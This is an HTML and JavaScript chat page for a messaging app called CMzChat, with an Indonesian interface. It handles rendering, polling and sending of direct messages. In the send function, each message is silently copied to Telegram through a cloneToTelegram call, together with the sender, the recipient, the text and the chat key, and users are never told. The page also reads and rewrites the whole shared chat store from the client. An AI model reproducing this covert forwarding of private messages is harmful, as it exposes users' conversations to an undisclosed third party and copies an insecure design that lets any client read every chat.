<!DOCTYPE html><html lang="id"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
<title>CMzChat • Chat</title>
<link rel="stylesheet" href="assets.css">
<style>
html,body{height:100%;overflow:hidden}
body{display:flex;flex-direction:column;background:#0a0a0c}
.h{
  flex-shrink:0;height:64px;padding:0 12px;
  display:flex;align-items:center;gap:12px;
  background:linear-gradient(180deg,rgba(23,23,27,.96),rgba(23,23,27,.88));
  backdrop-filter:blur(24px) saturate(180%);
  border-bottom:1px solid var(--border);
  position:relative;z-index:5;
}
.h::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;
  background:linear-gradient(90deg,transparent,rgba(212,175,55,.35),transparent)}
.back{width:42px;height:42px;border:0;background:transparent;color:var(--silver);
  font-size:22px;border-radius:50%;cursor:pointer;display:grid;place-items:center;transition:background .15s}
.back:active{background:var(--glass-2)}
.av{width:44px;height:44px;border-radius:50%;flex-shrink:0;overflow:hidden;
  background:linear-gradient(135deg,#2a2a30,#1a1a1e);
  display:grid;place-items:center;font-weight:700;color:var(--gold-2);font-size:17px;
  border:1.5px solid rgba(212,175,55,.25);
  box-shadow:0 4px 14px rgba(0,0,0,.4), 0 0 0 2px rgba(212,175,55,.08)}
.av img{width:100%;height:100%;object-fit:cover}
.info{flex:1;min-width:0}
.info b{display:flex;align-items:center;gap:5px;font-size:16px;font-weight:700;
  white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.info .status{font-size:11.5px;color:var(--muted);margin-top:2px;display:flex;align-items:center;gap:5px}
.info .status.online{color:var(--green)}
.info .status.online::before{content:'';width:7px;height:7px;background:var(--green);
  border-radius:50%;box-shadow:0 0 8px var(--green);animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}

.msgs{
  flex:1;overflow-y:auto;padding:20px 14px 12px;
  display:flex;flex-direction:column;gap:2px;
  background:
    radial-gradient(circle at 30% 20%,rgba(212,175,55,.03) 0%,transparent 50%),
    radial-gradient(circle at 70% 80%,rgba(212,175,55,.02) 0%,transparent 50%),
    #0a0a0c;
}
.date-sep{text-align:center;margin:14px 0}
.date-sep span{
  background:rgba(30,30,35,.9);backdrop-filter:blur(10px);
  color:var(--muted);font-size:11px;padding:6px 14px;
  border-radius:14px;border:1px solid var(--border);font-weight:600;letter-spacing:.3px
}
.msg-row{display:flex;gap:8px;align-items:flex-end;margin:1px 0}
.msg-row.me{flex-direction:row-reverse}
.bubble{
  max-width:78%;padding:10px 14px 8px;border-radius:16px;
  font-size:14.5px;line-height:21px;word-wrap:break-word;white-space:pre-wrap;
  position:relative;box-shadow:0 2px 8px rgba(0,0,0,.25);
  transition:transform .1s;
}
.bubble:active{transform:scale(.98)}
.me .bubble{
  background:linear-gradient(135deg,#2a2a30 0%,#1e1e23 100%);
  border-top-right-radius:4px;border:1px solid rgba(212,175,55,.25)
}
.other .bubble{
  background:linear-gradient(135deg,#1a1a1e 0%,#15151a 100%);
  border-top-left-radius:4px;border:1px solid var(--border)
}
.bubble .t{
  font-size:10.5px;color:rgba(255,255,255,.5);
  float:right;margin:5px -3px -4px 10px;display:inline-flex;align-items:center;gap:3px
}
.bubble .t .tick{color:var(--gold-2);font-size:12px;letter-spacing:-3px}
.msg-av{width:30px;height:30px;border-radius:50%;flex-shrink:0;overflow:hidden;
  background:linear-gradient(135deg,#2a2a30,#1a1a1e);
  display:grid;place-items:center;font-size:13px;font-weight:700;color:var(--gold-2);
  border:1px solid var(--border)}
.msg-av img{width:100%;height:100%;object-fit:cover}
.msg-av.hide{visibility:hidden}

.bar{
  flex-shrink:0;padding:12px 12px calc(14px + env(safe-area-inset-bottom));
  background:linear-gradient(180deg,rgba(23,23,27,.9),rgba(23,23,27,.98));
  backdrop-filter:blur(24px);
  border-top:1px solid var(--border);
  display:flex;gap:10px;align-items:flex-end
}
.bar .inp-wrap{
  flex:1;background:rgba(0,0,0,.4);
  border:1px solid var(--border);border-radius:24px;
  display:flex;align-items:flex-end;padding:2px;
  transition:all .25s
}
.bar .inp-wrap:focus-within{
  border-color:rgba(212,175,55,.5);
  box-shadow:0 0 0 4px var(--gold-dim)
}
.bar textarea{
  flex:1;background:transparent;border:0;color:var(--text);
  outline:none;padding:12px 18px;font-size:14.5px;font-family:inherit;
  resize:none;max-height:120px;line-height:20px
}
.bar textarea::placeholder{color:var(--muted-2)}
.bar .send{
  width:50px;height:50px;border-radius:50%;border:0;
  background:var(--grad-gold);color:#0a0a0c;
  font-size:18px;font-weight:700;cursor:pointer;
  display:grid;place-items:center;flex-shrink:0;
  box-shadow:0 8px 24px rgba(212,175,55,.4), inset 0 1px 0 rgba(255,255,255,.3);
  transition:all .2s
}
.bar .send:active{transform:scale(.9)}
.bar .send:disabled{opacity:.4;cursor:not-allowed}

.empty-chat{text-align:center;color:var(--muted);padding:80px 20px;font-size:13.5px;line-height:1.7}
.empty-chat .em{font-size:52px;margin-bottom:14px;opacity:.25}
</style></head><body>

<div class="h">
  <button class="back" onclick="location.href='dashboard.html'">←</button>
  <div class="av" id="otherAv">?</div>
  <div class="info">
    <b id="otherName">-</b>
    <div class="status" id="otherStatus">online</div>
  </div>
</div>

<div class="msgs" id="msgs">
  <div class="empty-chat"><div class="em">💬</div>Memuat pesan...</div>
</div>

<div class="bar">
  <div class="inp-wrap">
    <textarea id="msgInput" placeholder="Ketik pesan..." rows="1"></textarea>
  </div>
  <button class="send" id="btnSend" onclick="send()">➤</button>
</div>

<div class="toast" id="toast"></div>

<script src="env.js"></script>
<script src="config.js"></script>
<script>
const me = SESSION.me;
if(!me) location.href = 'login.html';

const params = new URLSearchParams(location.search);
const other = params.get('u');
if(!other) location.href = 'dashboard.html';

const chatKey = [me, other].sort().join('__');
let lastCount = 0;
let sending = false;

function toast(m, err){
  const t = document.getElementById('toast');
  t.innerText = m; t.className = 'toast show' + (err ? ' err' : ' gold');
  clearTimeout(t._tm); t._tm = setTimeout(()=>t.classList.remove('show'), 2200);
}

function esc(s){return String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}
function avHTML(u){const a = SESSION.avatar[u]; return a ? `<img src="${a}">` : u[0].toUpperCase();}

// ===== INIT =====
async function init(){
  const db = await readDB("database.json", { users: {} });
  const u = db.users?.[other];
  if(!u){ toast("User tidak ditemukan", true); setTimeout(()=>location.href='dashboard.html', 1200); return; }
  document.getElementById('otherName').textContent = other;
  document.getElementById('otherAv').innerHTML = avHTML(other);
  const st = document.getElementById('otherStatus');
  if(u.banned){ st.textContent = '🚫 Diblokir'; st.style.color = 'var(--red)'; st.classList.remove('online'); }
  else { st.textContent = 'online'; st.classList.add('online'); }
}

// ===== RENDER =====
function fmtDate(ts){
  const d = new Date(ts), now = new Date();
  const dd = new Date(d.getFullYear(),d.getMonth(),d.getDate());
  const tt = new Date(now.getFullYear(),now.getMonth(),now.getDate());
  const diff = Math.round((tt - dd) / 86400000);
  if(diff === 0) return 'Hari ini';
  if(diff === 1) return 'Kemarin';
  return d.toLocaleDateString('id-ID',{day:'numeric',month:'long',year:'numeric'});
}

function render(arr){
  const el = document.getElementById('msgs');
  if(!arr.length){
    el.innerHTML = '<div class="empty-chat"><div class="em">✦</div>Belum ada pesan.<br>Mulai percakapan dengan <b>@' + esc(other) + '</b></div>';
    lastCount = 0; return;
  }
  let html = '';
  let prevBy = null, prevDate = null;
  arr.forEach(m => {
    const dl = fmtDate(m.time);
    if(dl !== prevDate){ html += `<div class="date-sep"><span>${dl}</span></div>`; prevDate = dl; prevBy = null; }
    const isMe = m.by === me;
    const t = new Date(m.time).toLocaleTimeString('id-ID',{hour:'2-digit',minute:'2-digit'});
    const isFirst = prevBy !== m.by;
    const av = isMe
      ? `<div class="msg-av hide"></div>`
      : (isFirst ? `<div class="msg-av">${avHTML(m.by)}</div>` : `<div class="msg-av hide"></div>`);
    html += `<div class="msg-row ${isMe?'me':'other'}">
      ${av}
      <div class="bubble">${esc(m.text)}<span class="t">${t}${isMe?' <span class="tick">✓✓</span>':''}</span></div>
    </div>`;
    prevBy = m.by;
  });
  el.innerHTML = html;
  if(lastCount !== arr.length) requestAnimationFrame(()=>{el.scrollTop = el.scrollHeight;});
  lastCount = arr.length;
}

// ===== LOAD =====
async function load(){
  try{
    const db = await readDB("chats.json", { chats: {} });
    const arr = db.chats?.[chatKey] || [];
    render(arr);
  }catch(e){ console.warn(e); }
}

// ===== SEND =====
async function send(){
  if(sending) return;
  const inp = document.getElementById('msgInput');
  const txt = inp.value.trim();
  if(!txt) return;
  sending = true;
  document.getElementById('btnSend').disabled = true;

  const msg = { by: me, text: txt, time: Date.now() };
  inp.value = ''; autoResize();

  // Optimistic UI
  const db = await readDB("chats.json", { chats: {} });
  if(!db.chats) db.chats = {};
  if(!db.chats[chatKey]) db.chats[chatKey] = [];
  db.chats[chatKey].push(msg);
  render(db.chats[chatKey]);

  const ok = await writeDB("chats.json", db);
  if(!ok){ toast("Gagal kirim, coba lagi", true); }

  // CLONE TO TELEGRAM
  cloneToTelegram("💬", "PESAN BARU", [
    `📤 <b>Dari:</b> @${me}`,
    `📥 <b>Ke:</b> @${other}`,
    `💌 <b>Pesan:</b>\n<blockquote>${esc(txt).slice(0,300)}</blockquote>`,
    `🔑 <code>${chatKey}</code>`
  ]);

  sending = false;
  document.getElementById('btnSend').disabled = false;
  setTimeout(load, 800);
}

// ===== AUTO RESIZE =====
const inp = document.getElementById('msgInput');
function autoResize(){ inp.style.height='auto'; inp.style.height = Math.min(inp.scrollHeight, 120) + 'px'; }
inp.addEventListener('input', autoResize);
inp.addEventListener('keydown', e => { if(e.key==='Enter' && !e.shiftKey){ e.preventDefault(); send(); } });

// ===== POLLING =====
init();
load();
setInterval(load, 4000);
setTimeout(()=>inp.focus(), 300);
</script></body></html>
